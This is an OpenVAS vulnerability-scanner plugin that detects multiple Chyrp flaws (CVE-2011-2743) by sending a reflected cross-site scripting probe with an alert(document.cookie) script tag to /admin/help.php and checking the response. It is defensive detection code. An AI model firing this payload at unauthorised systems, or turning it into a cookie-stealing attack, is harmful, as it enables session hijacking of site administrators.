###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_chyrp_mult_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Chyrp Multiple Vulnerabilities
#
# Authors:
# Shashi kiran N <nskiran@secpod.com>
#
# Updated By: Shashi Kiran N <nskiran@secpod.com> on 2011-07-21
# Added CVE, BID, updated cvss base score, risk_factor and security warning
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to hijack the session of the
  administrator or to read arbitrary accessible files or to gain sensitive
  information by executing arbitrary scripts.
  Impact Level: Application";
tag_affected = "Chyrp version prior to 2.1.1";
tag_insight = "Multiple flaws are due to.
  - Insufficient input sanitisation on the parameters passed to pages related
    to administration settings, the javascript handler and the index handler
    leads to arbitrary javascript injection in the context of the user session.
  - Insufficient path sanitisation on the root 'action' query string parameter
  - 'title' and 'body' parameters are not initialised in the 'admin/help.php'
    file resulting in cross site scripting.";
tag_solution = "Upgrade to Chyrp version 2.1.1 or later,
  For updates refer to http://chyrp.net/";
tag_summary = "The host is running Chyrp and is prone to multiple vulnerabilities.";

if(description)
{
  script_id(802311);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-19 14:57:20 +0200 (Tue, 19 Jul 2011)");
  script_cve_id("CVE-2011-2743");
  script_bugtraq_id(48672);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Chyrp Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103098/oCERT-2011-001-JAHx113.txt");

  script_description(desc);
  script_summary("Determine if Chyrp is prone to XSS Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir(make_list("/blog", "/chyrp", "", cgi_dirs()))
{
  ## Send and Recieve the response
  req = http_get (item: string(dir, "/"), port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  ## Confirm the application
  if("Powered by" >< res && ">Chyrp<" >< res)
  {
    xss = '/admin/help.php?title="><script>alert(document.cookie);</script>';

    ## Try XSS exploit
    req = http_get (item: string(dir, xss), port:port);
    res = http_keepalive_send_recv(port:port,data:req);

    ## Confirm exploit worked by checking the response
    if('"><script>alert(document.cookie);</script>"' >< res)
    {
      security_warning(port:port);
      exit(0);
    }
  }
}
